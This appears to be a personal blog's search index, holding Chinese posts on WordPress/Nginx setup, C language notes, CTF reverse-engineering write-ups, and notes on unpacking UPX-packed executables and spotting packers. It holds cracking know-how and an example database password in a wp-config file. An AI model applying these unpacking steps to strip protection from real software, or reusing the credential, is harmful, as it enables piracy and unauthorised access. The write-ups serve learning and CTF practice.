\u0026lt;?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don\u0026#39;t have to use the web site, you can * copy this file to \u0026#34;wp-config.php\u0026#34; and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;root\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;MyPas$word4Word_Press\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); /**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */ define(\u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); define(\u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39;); /**#@-*/ /** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = \u0026#39;wp_\u0026#39;; /** * See http://make.wordpress.org/core/2013/10/25/the-definitive-guide-to-disabling-auto-updates-in-wordpress-3-7 */ /* Disable all file change, as RPM base installation are read-only */ define(\u0026#39;DISALLOW_FILE_MODS\u0026#39;, true); /* Disable automatic updater, in case you want to allow above FILE_MODS for plugins, themes, ... */ define(\u0026#39;AUTOMATIC_UPDATER_DISABLED\u0026#39;, true); /* Core update is always disabled, WP_AUTO_UPDATE_CORE value is ignore */ /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */ define(\u0026#39;WP_DEBUG\u0026#39;, false); /* That\u0026#39;s all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( !defined(\u0026#39;ABSPATH\u0026#39;) ) define(\u0026#39;ABSPATH\u0026#39;, \u0026#39;/usr/share/wordpress\u0026#39;); /** Sets up WordPress vars and included files. */ require_once(ABSPATH . \u0026#39;wp-settings.php\u0026#39;); 配置Nginx WordPress已经安装完毕，我们配置Nginx把请求转发给PHP-FPM来处理\n首先，重命名默认的配置文件：\ncd /etc/nginx/conf.d/ mv default.conf defaut.conf.bak 在 /etc/nginx/conf.d 创建 wordpress.conf 配置，参考下面的内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 server { listen 80; root /usr/share/wordpress; location / { index index.php index.html index.htm; try_files $uri $uri/ /index.php index.php; } # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 location ~ .php$ { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } 配置后，通知Nginx进程重新加载：\nnginx -s reload 3. 准备域名和解析 注册、购买域名 域名解析 ping域名通过后表示可以访问。\n","date":"2020-02-04T15:42:00Z","permalink":"https://dorinxl.github.io/p/%E6%90%AD%E5%BB%BAwordpress%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","title":"搭建WordPress个人博客"},{"content":"【个人笔记】ximo早期发的脱壳教程——手脱UPX壳 壳分为两种：压缩壳和加密壳，UPX是一种很简单的压缩壳。\n手脱UPX壳：\n工具：ExeinfoPE、OD\n对象：rmvbfix\n方法1：单步跟踪 将要脱的exe扔进od。\n这里选择\u0026quot;否\u0026quot;，不然有些操作会出现错误。\n进入之后从起点开始单步执行（快捷键F8），遇到pxx注意跳跃方向，手动断点跳过往回跳的指令。\n遇到这种jxx后跟call指令的一并跳过。\n一直单步知道如上图这样的，跳跃跨度极大，让其跳跃后便可以到达真正的入口：\n在入口我们右键便可以用od内工具进行脱壳。\n这里选择方式1/2都可以。\n方法2：ESP定律法 一进入要先确保硬件断点是清空状态的。\n我们进行push入栈之后，在右侧寄存器里可以看到ESP有了操作，右键让其进入数据窗口。\n也可以在下方指令框中输入 dd/hr ESP地址\n设置硬件访问，word和Dword都可。\n然后运行一下：\n随后就和方法1一样继续往下走。\n方法3：二次内存镜像法 可以通过菜单栏\u0026quot;查看—内存\u0026quot;或直接按m进入内存界面：\n对区段\u0026quot;.rsrc\u0026quot;下断点，下面的区段不用管，之下第一个rsrc，后面的是系统的区段。\n下完之后运行走一步，然后回来：\n回来之后在401000处再下一次\n随后单步往下走，同方法1\n方法4：直捣黄龙（适用于绝大部分的UPX壳和部分Aspack壳） 众所周知，push的反义词是pop，有入栈的push，必定有出栈的pop\n我们查找popad，因为是pushad所以后面的ad相同，注意不用勾选整个块，因为整个块的popad绝对不止一个。\n好，找到了，单步运行，同方法1\n","date":"2020-02-02T15:20:00Z","permalink":"https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0ximo%E6%97%A9%E6%9C%9F%E5%8F%91%E7%9A%84%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E6%89%8B%E8%84%B1upx%E5%A3%B3/","title":"【个人笔记】ximo早期发的脱壳教程——手脱UPX壳"},{"content":"2.1【欢乐向】逆向刷题被虐哭日常记录 前面好多题之前做了也没记录，懒得整了，直接从剩下的几个开始：\nGetit 这一段是解密的关键，后面的是把flag写入文档又给删了。\n其实可以修改程序逻辑让他别删， 但是我不会 。\n逆着来推一边，不会写py，用c写个。\n？不应当，我大概是忘了加括号。\n？？？我觉得我的没啥问题，去网上查了查相关的：\n在IDA里没看到有S，咱也不知道咋回事。\nno-strings-attached 直接扔IDA瞅瞅：\n挨个函数筛，筛出最后一个有、东西。\n有个叫decrypt的函数，看起来像是加密函数，去gdb里下个断点看看。\nr运行，n单步走。\n中间那一大坨大概是没设置好，现学gdb怎么用先不管了。\n查内存找字符串，\n加密好的东西放进了寄存器eax里：\n翻翻寄存器里的东西，找到第一个0x00结尾的是字符串的结尾。\nx:就是用来查看内存中数值的，后面的200代表查看多少个，wx代表是以word字节查看看，$eax代表的eax寄存器中的值\n在这里我们看到0x00000000，这就证明这个字符串结束了，因为，在C中，代表字符串结尾的就是\u0026quot;\\0\u0026quot;,那么前面的就是经过decrypt函数生成的falg\nC：按字符格式显示，把这些十六进制的换成好看一点的。\npython-trade： Pyc文件，网页反编译一下：https://tool.lu/pyc/\n。\n翻译翻译，这堆字母让我们输入一串字符串，然后经过encode函数一系列操作之后和correct比较，正确了就算是输对了flag。\n那咱们就反其道而行之。\n先给他把correct给base64解密了。\n完事了之后在逆着走一遍。\n再次被自己菜哭，我觉得没啥问题咋就不给我过？\n又上网查了查，去评论转了一圈，发现有人说可能是base64解码的问题，我用的网页解码，不应该有差才对的，怪事。\n补上了几个字符然后过了，正确的是这个：nctf{d3c0mpil1n9_PyC}\nMaze 题目给的叫迷宫，运行了一下也没啥东西，扔进ida看看：\n看起来像是四个字符：0oO.\n其实在IDA里把光标选择ASCII码按R键就可以把ASCII码变成字符了。\n然后这几个是坐标移动\nv9是一个二维数组，用来控制上下和左右这两种方向的。\n两种可能：\n1.v9代表横向、\u0026amp;v9+1代表竖向\n2.v9代表竖向、\u0026amp;v9+1代表横向\n反正是诶个试过去了\n从左上角到#，经历→↓→→↓↓←↓↓↓→→→→↑↑←←，转换为o0oo00O000oooo..OO\nFlag：nctf{o0oo00O000oooo..OO}\n好像是南邮的题吧\u0026hellip;真厉害。\n还剩一个比较难搞，明天继续。\n","date":"2020-02-01T13:50:00Z","permalink":"https://dorinxl.github.io/p/2.1%E6%AC%A2%E4%B9%90%E5%90%91%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8B%E9%80%86%E5%90%91%E5%88%B7%E9%A2%98%E8%A2%AB%E8%99%90%E5%93%AD%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/","title":"2.1【欢乐向】攻防世界新手逆向刷题被虐哭日常记录"},{"content":"**【个人笔记】 **\n《吾爱破解培训第一课：破解基础知识之介绍常见工具和壳的特征》讲师：Hmily\n0x00 前提\n目的：认识、辨别普通的壳，不同的壳有不同的目的。\n网站内资源准备好：吾爱破解虚拟机环境、脱壳例子下载、视频课程。\nl是日志，e是模块信息，包含程序加载的完整模块和路径，m是内存和地址，t是线程，w是窗口，h是句柄信息，c是反汇编窗口，p记录管理员修改信息，k是调用的堆栈，b断点。\n把exe文件拖入exeinfope中查看是哪种语言编译的，是否加壳。\n全文仅供个人记录使用，如有疏漏敬请包容。\n0x01 程序是什么语言编译的\n从目前国内接触到程序看，比较流行的编译器有：VC系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT等，下面提供一些由论坛同学编译出来的试炼品，结合实例来看看\u0026quot;入口点代码\u0026quot;、\u0026ldquo;程序区段\u0026quot;和\u0026quot;加载模块\u0026quot;等特征。\nVC6编译无壳程序\n查看入口点代码如下：\nPEID查看区段如下：\n** VC6特点：入口点代码是固定的代码，入口调用的API也是相同的，其中有的push地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data和.rsrc。**\nVS2008和VS2013编译无壳程序 __\nOllyDbg查看入口点代码如下：\nPEID查看区段如下：\n** VS特点：入口点只有两行代码，一个CALL后直接JMP，第一个CALL进去后调用的API也是相同的；区段相对于VC6多了一个.reloc。**\n易语言编译无壳程序（独立编译和非独立编译）\n（由于易语言独立编译是调用VC的链接程序编译的，所以从区段和入口代码特征和VC相同，下图为非独立编译带运行库）\nOllyDbg查看入口点代码如下：\n查看模块：\n查看核心代码：\n** 易语言特点：可以从程序里找一些call的调用最终都会走到上面核心代码图位置（文字不太好表达），这个方法可以区分和VC的区别，非独立编译比较容易识别，入口特征和模块特征都有krnln.fnr。**\nDelhpi编译无壳程序\n.net特征 ：** 看模块，加载了很多的.net库**\n0x02 部分壳的特征\nAspack\n区段：\n入口特征：\nUPX\n区段：被压缩过，压缩结果是UPX0和UPX1，名称可以随便改，基本就是三个\n入口特征：\nThemida\n区段：后两个名称随机\nVmprotect：\n主要看区段特征：\n入口特征显得杂乱无章\nShielden\n区段：\n入口（经跳转和分析过的）：\n加壳技术可以方便我们对程序进行保护、压缩等措施，而脱壳技术则方便我们对程序进行更大程度上的修改。\n附：【初学者教程】破解基础知识之认识壳与程序的特征（本文有摘抄） https://www.52pojie.cn/thread-234739-1-1.html ","date":"2020-01-31T10:38:00Z","permalink":"https://dorinxl.github.io/p/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%B8%80%E8%AF%BE%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/","title":"吾爱破解培训第一课个人笔记"},{"content":"计算机的三个子系统：中央处理单元（CPU）、主存储器和输入/输出子系统。\n中央处理单元\nCPU有三个组成部分：算术逻辑单元、控制单元、寄存器组。 算术逻辑单元控制三种操作：逻辑运算、移位运算、算术运算。 寄存器有三部分：数据寄存器、指令寄存器、程序寄存器。 控制单元控制各个子系统的操作。 主存储器\n主存储器是存储单元的集合，每个存储单元有位移标识，称为地址。内存地址用无符号二进制整数定义。 存储器的类型： RAM（随机存取存储器），断电后信息丢失。 RAM分为静态(SRAM)和只读(DRAM)。 SRAM用传统触发器门电路，速度快，但价格昂贵； DRAM使用电容器，速度慢但价格便宜。\nROM(只读存储器)，断电后信息不会消失。 PROM(可编程只读存储器)可用来存储特定程序。 EPROM(可擦除可编程只读存储器)可用紫外光擦写。 EEPROM(电可擦除可编程只读存储器)用电子脉冲来编程和擦写。\n输入/输出子系统\n非存储设备：键盘、监视器、输出设备等。 存储设备：磁介质存储设备、光存储设备 子系统的互联\nCPU和存储器之间的连接：有三组线路连接在一起，分别是数据总线、地址总线和控制总线。 I/O设备的连接：输入输出设备通过一种被称为输入/输出控制器或接口的器件连接到总线上。几种控制器： 小型计算机系统接口(SCSI) 火线 通用串行总线(USB) 高清晰度多媒体接口(HDMI) 输入输出设备的寻址是数据在CPU和输入输出设备中传送的过程，有两种寻址方法，分别是：I/O独立寻址和I/O存储器映射寻址。 程序执行\nCPU利用重复的机器周期来执行程序中的指令，一个周期包括三部分：取指令、译码和执行。\n输入输出设备的运行比CPU要慢得多，有三种方法被设计用于控制同步，分别是：程序控制输入/输出、中断控制输入/输出、直接存储器存取。\n不同的体系结构\nCISC—复杂指令计算机 RISC—精简指令计算机 并行处理 SISD(单指令流，单数据流) SIMD(单指令流，多数据流) MISD(多指令流，单数据流) MIMD(多指令流，多数据流) ","date":"2020-01-29T13:38:00Z","permalink":"https://dorinxl.github.io/p/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/","title":"第五章 计算机组成"},{"content":"第一届“信安杯”部分WriteUp\u0026mdash;\u0026mdash;OooooohLeeGay队！ 小队成员（按姓氏）：郭泽坤、李江川、赵乐祺 以下这部分是做出来的 2019.11.23-24 ++Re1：++ 解题：李江川，郭泽坤\n打开题目链接，压缩包解压后有一个.exe,打开后是一个让你点灯的游戏，所有灯点亮后就会得到flag\n直接一路输入1~8，发现全部灯被点亮，得到flag。\n++Re2：++ 解题：赵乐祺\n下载下来之后是开源文件，c语言，读一下：\n可以知道，first是十六进制的0xcafe，second是一个数，这个数不能满足(second % 5 == 3 || second % 17 != 8)，那么最小的这个数17+8=25满足；同时strlen是指字符串长度，也就是7，我们把这些数值算出来再用十六进制表示即可得到一个长得很奇怪的flag；\n我还是要吐槽一遍长的是真的奇怪，应该是我见过的太少了。\n++Re3++： 解题：赵乐祺\n打开后发现了py的字样，是提示，这是一份py文件，用python反编译之后是个迷宫（maze）：\n把迷宫从一维变为二维：\n按照代码给出的位置移动的输入方法，输入了一堆字符串。flag里就是我们input的这些字符串。\n++Re5：++ 解题：赵乐祺\n冰菓大法好！咳咳。\n打开这个exe让我们输入flag，随便瞎点两下，找到了提示，让我们把这个exe扔进dnspy看看：\n一页一页的点下来后发现了这么一大串看起来像是ascii的东西，直觉告诉我们这就是flag了（其实英文好可以看出来encryptstr是一个复合单词，加密字符串）\n自己写个解密的c：\n运行得出结果：\n++Misc1漫漫长路签到题：++ 解题：赵乐祺、李江川\n打开后说有两张图：\n看了一下内存大小，挺大的，在010editor中找到了【50 4B 01 02】等zip的头文件字样，大胆的把后缀改为zip，amazing！：\n打开之后就是社工大法好：\n然后由不愿意透露姓名的官方提供：\n++Misc2 很简单的Hex：++ 解题：李江川\n开幕暴击:\n打开题目链接，下载压缩包，是一张图片，可能是有隐写，但是用stegsolve并没有发现在图层之间有隐藏信息\n那就考虑查看文件格式，发现flag：\n++Misc3不想让你打开：++ 解题：赵乐祺\nzip伪加密：\n把伪加密改回00 00，解压之后有这些东西：\n下意识的把zip扔进010：\n改了之后发现并没有什么卵用：\n折返去看没想到吧.txt【确实没想到】把这串很像密码的东西转码试试，十六进制转字符串：\n++Web1 easyjs：++ 解题：郭泽坤\n打开网页发现一直刷新，提示我们让网页停止刷新就可以拿到flag，想到用Burp拦截。\n拦截之后并未发现什么有价值信息，尝试发送给中继器，直接运行，发现flag：Flag: flag{0k_u_hav3_caught_m3_}\n没了，web就做出来一道，嘤。\n++Crypto1我混乱了：++ 解题：李江川\n是长的挺乱的，但是依稀可见rxms像是flag的字样，凯撒密码转换器转换一下得到flag： ++Crypto2很基础的大礼包：++ 解题：李江川\n辗转相转法，爱的flag转圈圈： 首先16转文本：\n接着base32：\n然后两次base64：\n第二次：\n++Crypto3暴力的RSA：++ 解题：赵乐祺\n题目说的很明白了，RSA加密算法：\ntxt打开是这个样子的：\n想着能不能转换成可以看懂的东西的想法，尝试把后缀名改成了c，希望得到代码什么的，结果得到了：\n从网上找一下算法步骤：\n密匙有了，大数位运算，py来得方便【比c高精度友好多了】\n以上，就是我们OooooohLeeGay小队做出来的题目，至于剩下的，大多是做一半卡死了。\n以下是做一半的思路\n++Web2奥里给：++ 放进burp里查了半天，李江川同学查出来个页面：\n然后无果，无奈。 其他的web也试了试，皆无果而终。\n++Re4\u0026amp;\u0026amp;6：++ re4在找各种蛛丝马迹【因为ida用的不熟】：\n当我发觉到flag被分为各个部分的时候，我就意识到八成找不全了。\n至于re6同样在各种软件中检测一番无果而终\n++Misc：++ 喵喵的思考，一只猫愣是把我盯得无能狂怒。 Dance，看着word文档，改成了zip文件解压之后就不会了。\n以上。 ","date":"2019-11-25T05:09:00Z","permalink":"https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/","title":"第一届“信安杯”部分WriteUp"},{"content":"第十一章 字符串和字符串函数 11.1 i表示字符串和字符串I/O puts()函数只显示字符串，而且自动在显示的字符串末尾加上换行符 11.1.1 在程序中定义字符串 字符串字面量(字符串常量) 用双引号括起来的内容称为字符串字面量(string literal),也叫字符串常量(string constant) 字符串常量属于静态储存类别 字符串数组和初始化 让编译器计算数组大小只能用在初始化数组时。如果创建一个稍后再填充的数组，就必须在声明时指定大小。 两种初始化： 1 2 1. 字符数组名初始化： char car[10] = \u0026#34;Tata\u0026#34;； 2. 指针数组初始化： char * pt1 = \u0026#34;Something is pointing at me\u0026#34;; 数组和指针的区别 字符串储存在静态储存区中 初始化数组把静态存储区的【字符串】拷贝到数组中，而初始化指针只把字符串的【地址】拷贝给指针 数组的元素是变量（除非数组被声明成const），但数组名不是变量。 如果不修改字符串，不要用指针指向字符串字面量。 字符串数组 创建字符数组： 1 2 1. 指向字符串的字符数组 2. char类型数组的数组 下标访问字符串 字符串数组[字符串下标][字符串字符] 字符数组和char数组的区别： 1 2 3 1. 大小不同，类型不同。 2. 储存方式不同，静态内存和副本的区别。 3. 字符串数组分配内存的使用率较低。 在选择上 1 2 1.需求效率：使用指针数组，但是不可修改，会擦写程序内存。 2.需求更改或输入：使用字符数组，但是效率低。 11.1.2 指针和字符串 区分指针的值，指针指向的值：指针的值是指向的地址，指针指向的值是地址存储的内容。 11.2 字符串输入 11.2.1 分配空间 在创建字符串数组时有必要分配空间，以防止擦写其他程序或内存 1 2 1.在声明时显式指明数组大小 2.使用C库函数来分配内存 11.2.2 不幸的gets()函数 本是用于处理整行输入。 gets()函数只知道数组的开始处，并不知道其中有多少个元素。如果输入的字符串过长，可能会导致缓冲区溢出。 gets()函数会读取输入至换行符，并丢弃换行符，在末尾添加\\0，进行存储。 11.2.3 gets()函数的代替品 fgets()函数（ 和fputs()函数 ） 三大特点： 1 2 3 1. 限制： fgets()函数指明了读入字符的最大数量，保存在第二个参数中，如果参数是n，那么将读取n-1个字符。 2. 保留： 如果fget()函数读取到一个换行符，那么会将其储存而不是删除。 3. 来源： fgets()第三个参数指明要读取的文件。如果来源于键盘，则以stdin为参数。 puts()函数会在输入的字符串末尾添加一个换行符，而fgets()不会。 fgets()处理多行输入： 1 2 3 while(fgets(words,lens,stdin)!=NULL \u0026amp;\u0026amp; word[0]!=\u0026#39;\\n\u0026#39;){ fputs(words,stdout); } get_s()函数 基本形式： 1 get_s(字符串地址，大小)； get_s()与fgets()的区别： 1 2 3 1. get_s()没有第三个参数，只从标准输入中读取数据。 2. get_s()如果读到换行符，会舍弃它。 3. 关于选择： 存储区装得下输入，三者无差，但fgets()会保留\\n 存储区装不下输入，fgets()可以灵活处理。 11.2.4 scanf()函数 scanf(),fgets()和gets()函数的区别在于如何确定字符串的末尾。 scanf()函数会返回一个整数值，该值等于scanf()成功读取的项数或者EOF（读到文件末尾） %s可防止输入溢出。 11.3 字符串输入 打印字符串的三个标准库函数：puts(),fputs()和printf(); puts()函数 传入地址。 puts()函数会在字符串末尾自动添加一个\\n； 该函数遇到空字符就会停止输出，所以必须保证又空字符存在。 gets()丢弃换行符，但puts()添加换行符 fputs()函数 第二个参数指明来源 不会在输出的末尾添加\\n fgets()保留换行符，且fputs()不会添加换行符。 printf()函数 打印多个字符串比较简单。 11.4 自定义输入/输出函数 自己写函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 void put1(const char * string){ while(*string){ //与*string ！=\u0026#39;\\0\u0026#39;相同,当string指向空字符时，*string的值时0 putchar(*string++); // ++优先级高于* } } int put2(const char * string){ int count=0; while(*string){ putchar(*string++); count++; } putchar(\u0026#39;\\n\u0026#39;); return count; } 11.5 字符串函数 strlen()函数\n表示长度，存在于string.h strcat()函数\n作用：拼接两个字符串 示例 1 strcat(str1,str2); // 将str2拼接到str1后面，改变str1而不改变str2 缺点：strcat无法检测第一个数组能否容纳第二个数组，可能会造成字符溢出。 strncat()函数\n改进strcat()函数，第三个参数指定最大添加字符数，末尾自动添加空字符。 示例 1 strnact(str1,str2,size); //将str2的前size个字符拼接到str1后面。 strcmp()函数\n作用：比较字符串，如果相同则返回0，否则返回非零值。 示例 1 strcmp(str1,str2); 本机操作 返回的值：从不相同的字符开始，前一个字符排在ascii前则返回-1，否则返回1，相同0； 书本 返回的值是前一个字符串的acsii码减后一个的，按照机器排序顺序进行比较。 strncmp第三个参数指定查找前几个字符。 strcpy()和strncpy()函数 sprintf()函数\n1 其他字符函数\n","date":"2019-11-06T03:04:00Z","permalink":"https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82%E7%AC%94%E8%AE%B0/","title":"《C Prime Plus》第十一节笔记"},{"content":"数组和指针 10.1 数组 10.1.1 初始化数组 标量变量：只储存单个值的变量\n创建只读数组，应该用const声明和初始化数组\n1 const int days[] = {1,2,3,5}; 省略方括号中的数字，编译器会自动匹配数组大小和初始化列表中的项数\n10.1.2 指定初始化容器 c99 例：\n1 int arr[6] = {[5]=212}; 重要特性一：如果指定初始化容器后面又更多的值，如[5]=4,22,566；那么后面这些值将被用于初始化指定元素的后面的元素 重要特性二：初始化可以覆盖之前的初始化 10.1.3 给数组元素赋值 10.1.4 数组边界 使用越界的数组会造成意外错误，例如改变其他数组元素的值，或是导致程序异常终止 10.1.5 指定数组的大小 1 2 int n=5; int arr[n]; 以上的初始化方式在c99之前不允许，而c99允许这样做。这创建了一种新的数组：VLA VLA成为变长数组(variable-length array) 10.2 多维数组 10.3 指针和数组 数组名是数组首元素的地址\n1 arr == \u0026amp;arr[0]; 指针的加减是它所指向类型的大小加减\n10.4 函数、数组和指针 int ar[]和int *ar形式都表示ar是一个指向int的指针，但是，int ar[]只能用于声明形式参数，第二种可以改变数组内容。 10.4.1 使用指针形参 用函数处理数组 一个指针形参标识数组开始，另一个整数形参表示待处理数组元素个数。 一个指针指向数组的开始处，另一个指向数组的结束处。 C 保证在给数组分配空间时，指向数组后面第一个位置的指针仍是有效的指针。 10.4.2 指针表示法和数组表示法 10.5 指针基本操作 分别是： 赋值 解引用 取址 指针和整数相加 递增指针 指针减去一个整数 递减指针 指针求差 比较 C 只能保证指向数组任意元素的指针和指向数组后面第1个位置的指针有效。 千万不要解引用未初始化的指针，否则可能会擦写数据或代码。 指针的第一个基本用法是在函数间传递信息，第二个基本用法是用在处理数组的函数中。 10.6 保护数组中的数据 10.6.1 对形式参数使用const 不能修改数组中的数据内容，保护原始数据 10.6.2 const的其他内容 const指针虽然不能修改其所指向的数据，但可以使其指向其他地址。 把const数据或非const数据的地址初始化为指向const的指针或为其赋值时合法的。 而普通指针只能被赋予非const数据的指针 const 类型 * -\u0026gt; 定值，不可被修改 类型 const * -\u0026gt; 定地址，不可被修改 const 类型 *const -\u0026gt; 值与地址都不可被修改 10.7 指针和多维数组 地址的地址或指针的指针就是双重间接的例子\n1 2 3 4 int arr[4][2]; arr==\u0026amp;arr[0]; arr[0]==\u0026amp;arr[0][0]; 最好用简单的数组表示法，而不是指针表示法。\n10.7.1 指向多维数组的指针 声明：\n1 2 3 4 int (* p)[2]; //p是指向一个内含两个int类型的数组的指针 //而[]的优先级高于*，我们可以省去括号： //[]先和p结合成数组，然后*表示p内含指针 int * p[2]; //p是一个内含两个指针元素的数组，每个元素都指向int的指针 10.7.2 指针的兼容性 10.7.3 函数和多维数组 如果arr是二维数组，arr[]就是一维数组，可将其视为二维数组的一行\n一般而言，声明一个指向N维数组的指针时，只能省略最左边方括号中的值：\n1 int sum4d(int arr[][20][30][15] , int rows ); 10.8 变长数组（VLA） C99新增了变长数组(variable-length array，VLA),允许使用变量表示数组的维度，如下:\n1 2 3 int quarter = 4; int regions = 5; double VLA[quarter][regions]； //一个变长数组VLA 变长数组不能改变大小，这里的“变”的意思是：在创建数组时，可以使用变量指定数组的维度。\n声明一个带二维变长数组参数的函数，要注意顺序：\n1 int sun2d(int rows, int cols,int ar[rows][cols] ); 变长数组还允许动态内存分配，可在程序运行时指定数组大小。普通的C数组都是静态内存分配，即在编译时确定数组大小。\n10.9 复合字面量 C99新增了复合字面量(compound literal),字面量是除符号常量外的常量。\n1 2 3 int diva[2] = {10,20}; //一个普通的数组声明 (int [2]) {10,20} //复合字面量 (int []) {10,20} //复合字面量也可以省略大小，编译器自动计算 因为复合字面量是匿名的，所以不呢个先创建后使用它，必须在创建的同时使用它。使用指针记录就是一种用法：\n1 2 int *pl; pl = (int []) {10,20}; //这个与diva数组完全相同 10.10 关键概念 数组用于储存相同类型的数据，C把数组看作是派生类型 在把数组名作为实际参数时，传递给函数的不是整个数组，而是数组的地址。 ","date":"2019-11-06T02:56:00Z","permalink":"https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E8%8A%82%E7%AC%94%E8%AE%B0/","title":"《C Prime Plus》第十节笔记"},{"content":"第九节 函数 9.1 复习函数 函数原型 function prototype 函数调用 function call 函数定义 function definition 形参 实参 典型的ANSI C函数的定义： 1 返回类型 名称（形参声明列表） 9.2 ANSI C函数原型 主调函数把它的参数储存在被称为栈(stack)的临时储存区 错误导致无法编译，而警告仍然允许编译 9.3 递归 printf使用%p打印地址 递归的优缺点 1 2 1.优点是递归为某些编程问题提供了最简单的解决方案 2.缺点是递归算法会快速消耗计算机的内存资源 9.4 编译多源代码文件的程序 scanf(\u0026quot;%*s\u0026quot;)跳至下一个空白字符 9.5 查找地址：\u0026amp;运算符 一元运算符\u0026amp;给出变量的存储地址 PC地址通常用十六进制形式表示，每个十六进制对应四位 %p是输出地址的转换说明 9.6 更改主调函数中的变量 典型例子：用函数交换两个值 9.7 指针简介 指针(pointer)是一个值为内存地址的变量(或数据对象) 9.7.1 简介运算符 * 使用间接运算符(indirection operator)找出内存地址所对应的值，又是也称为解引用运算符(dereferencing operator) 9.7.2 声明指针 指针是一个新类型，需要声明指针所指变量的类型 1 2 3 int * pi; char * pc; float * pf,* pg; 9.7.3 使用指针在函数间通信 函数无法直接访问其他函数中的变量，这种限制访问保护了数据的完整性。但是，当确实需要在函数中访问另一个函数的数据时，可以把指针作为函数的参数。 如果需要在被调函数中修改主调函数的变量，使用地址或指针作为参数。 ","date":"2019-11-06T02:39:00Z","permalink":"https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E4%B9%9D%E8%8A%82%E7%AC%94%E8%AE%B0/","title":"《C Prime Plus》第九节笔记"},{"content":"第八节 字符输入/输出和输入验证 8.1 单字符I/O：getchar()和putchar() getchar()和putchar()包含在stdio.h头文件中 8.2 缓冲区 无缓冲输入： 直接回复用户 缓冲输入： 暂缓回复 缓冲区：收集用户输入字符的临时存储区 节省时间 可以修正输入 完全缓冲I/o：当缓冲区被填满时才刷新缓冲区 行缓冲I/O：出现换行符时刷新缓冲区 8.3 结束键盘输入 8.3.1 文件、流和键盘输入 8.3.2 文件结尾 文件结尾的一种方法：在文件的末尾放置一个特殊的字符文件标记（ctrl+z) 另一种方法：储存文件大小的信息 getchar()和scanf()读取到文件末尾返回EOF EOF在stdio.h中被预处理定义 UNIX中Ctrl+D PC中Ctrl+Z 8.4 重定向和文件 8.4.1 UNIX、Linux和DOS的重定向 重定向输入让程序使用文件而不是程序输入 重定向输出让程序输出到文件而不是屏幕 重定向输入 \u0026gt; 重定向输出 \u0026lt; 组合重定向 \u0026gt;输出文件 \u0026lt;输入文件 关于重定向的要求： 程序与文件放在同同一路径下 cmd窗口使用时用cd指令来改变路径 一对一原则 \u0026laquo; 可以将字符加在文件之后而不覆盖 8.5 创建更友好的用户界面 8.5.1 使用缓冲输入 考虑用户各种输入情况 处理好输入结尾\\n 8.5.2 混合数值和字符输入 getchar()读取每个字符，包括空格、制表符和换行符，而scanf()则会跳过这些 scanf()输入会返回数值，数值代表成功读取个数 8.6 输入验证 8.6.1 分析程序 程序遵循模块化的编程思想，使用独立函数（模块）来验证输入和管理显示。 8.6.2 输入流和数字 